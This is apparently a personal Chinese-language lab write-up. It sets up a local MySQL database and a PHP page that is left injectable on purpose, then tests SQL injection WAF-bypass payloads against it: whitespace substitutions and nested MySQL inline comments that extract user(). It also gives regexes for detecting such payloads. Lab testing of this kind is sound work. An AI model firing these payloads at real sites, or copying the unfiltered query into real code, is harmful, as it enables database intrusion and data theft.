---
title: Bypass sqli 
date: 2017-12-19 15:54:24
tags:
		- Bypasswaf
		 
categories:
		- WAF
---

从网上收集整理一些绕过WAF的一些技巧，测试一下是否真的可以绕过。

<!--more -->

##### Bypass sqli 

20171031

创建数据库

	mysql> create database waf;
	Query OK, 1 row affected (0.00 sec)
	
	mysql> use waf;
	Database changed

测试的两张表

	mysql> create table if not exists `news`(
	    -> `id` int(10) unsigned not null auto_increment,
	    -> `title` varchar(30) not null,
	    -> `content` varchar(256) not null,
	    -> primary key(`id`)
	    -> );
	Query OK, 0 rows affected (0.04 sec)
	
	mysql> insert into `news` (`id`,`title`,`content`) values
	    -> (1,'php','Php is a good lanagule'),
	    -> (2,'python','python is good');
	Query OK, 2 rows affected (0.00 sec)
	Records: 2  Duplicates: 0  Warnings: 0	


user

	mysql> create table `user`(
	    -> `id` int(10) not null auto_increment,
	    -> `name` varchar(30) not null,
	    -> `passwd` varchar(256) not null,
	    -> primary key(`id`)
	    -> );
	Query OK, 0 rows affected (0.04 sec)
	
	mysql> insert into `user` (`id`,`name`,`passwd`) values
	    -> (1,'Tom',md5(123456)),
	    -> (2,'Cary',md5(12345678));
	Query OK, 2 rows affected (0.00 sec)


数据库的连接，将内容展示到前端中。


	<?php
	$id = $_GET['id'];
	$conn = mysqli_connect('127.0.0.1','root','root','waf');
	if(!$conn){
	    die('Could not connect the database');
	}
	//获取get参数数据
	$id = $_GET['id'];
	//未经过滤，直接进数据查询
	$sql = 'select * from news where id='.$id;
	$result = mysqli_query($conn,$sql);
	$row = mysqli_fetch_array($result);
	echo $row['id'];
	echo '<br/>';
	echo $row['title'];
	echo '<hr/>';
	echo $sql;
	mysqli_close($conn);
	?>

测试，看到确实是一个注入点。


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-10-31/90841889.jpg)


##### 绕过

很多网站都是存在WAF防御，现在测试用来绕过WAF的`payload`在自己的环境上是否可以成功执行,如果执行成功的话，那就测试某家的WAF是否可以防御。

><font color=red>BYPASS WAF的原理。去处理实际上位于WAF设备之后处理应用层数据包的硬件/软件的特性。利用特性构造WAF不能命中，但是在应用程序能够执行成功的载荷，绕过防护。</font>


**union+select**

绕过`union+select`，可以考虑的方法。

1. 空格的替换 `%20、+、 /**/`
2. Mysql中可以利用的空白字符: `%09,%0a,%0b,%0c,%0d,%20,%a0`
3. 内联注释 `/!1222select/`

	%0c = form feed, new page
	
	%09 = horizontal tab
	
	%0d = carriage return
	
	%0a = line feed, new line。 新的一行

对于其中空格的替换，以及`mysql`中可利用的空白字符，可以成功执行。但是结合`union select`测试`WAF`的时候，都可以防御。

	(?i:union\b.*?\bselect\b)

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-10-31/99643534.jpg)
		

mysql可利用空白符的理解。在url中插入这些字符，但是在入库查询的时候，这些字符就不见了，即空白字符。比如`%09`

	127.0.0.1/waf/test.php?id=-1 union%09select 1,user(),3

可以正常执行，注入出数据。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-10-31/77165993.jpg)

那试试`%08`呢？这次就发现，sql语句不能成功执行了。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-10-31/1171748.jpg)


**内联注释**

`Hackbar`自带的几种注释。



![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-18/97975578.jpg)

**`/*_STRING_*/`** 能够正确执行，可以出数据，WAF可防御。

	127.0.0.1:8000/waf/test.php?id=-1 /*!union*/ select 1,user (),3 

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-18/93606267.jpg)


**`/*!50000_String_*/`** 能够正确执行，可以出数据，WAF可防御。

	127.0.0.1:8000/waf/test.php?id=-1 /*!50000union*/ select 1,user (),3 

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-18/75381712.jpg)

**`/*!12345_string_*/`** 能够正确执行，可以出数据，WAF可防御。

	127.0.0.1:8000/waf/test.php?id=-1 /*!12345union+select*/ 1,user (),3 

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-18/7930045.jpg)

**`/*!*13337_string_*/`** 能够正确执行，可以出数据，WAF可防御。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-18/80373497.jpg)


**`/*!/*!string*/`** 注释，可正确执行，出数据，绕过某锁。

	http://192.168.145.156:8000/test.php?id=-1 union select 1,user(),3

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-18/54846943.jpg)

注释一下，绕过。

	http://192.168.145.156:8000/test.php?id=-1/*!/*!union*//*!/*!select*/ 1,user (),3 


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-18/93650271.jpg)


自己又胡乱捣鼓了一下。

	/*! /*!order/*/*/by*/ 3

	http://192.168.145.156:8000/test.php?id=-1 /*!/*!union/*/*/select*/ 1,user(),3

好像也能过去的。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-18/4973873.jpg)


对于注释绕过，如何写正则呢？可以看到注释，一定含有 `/*string*/`。匹配`/*string*/`。
	
	(?i:(/\*(.*?)\*/))

	

**思考空格代替**

以上的空格代理的案例，确实可以在实际环境中正确注入出数据，但是在测试设备的时候已经拦截。






##### 参考

[http://www.cnblogs.com/xiaozi/p/7275134.html](http://www.cnblogs.com/xiaozi/p/7275134.html)

[SQL注入中可以替换空格的字符](https://www.2cto.com/article/200810/30021.html)

[SQLi —— 逗号，空格，字段名过滤突破](http://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/)

[Bypass WAF Cookbook](http://drops.xmd5.com/static/drops/tips-7883.html)


	


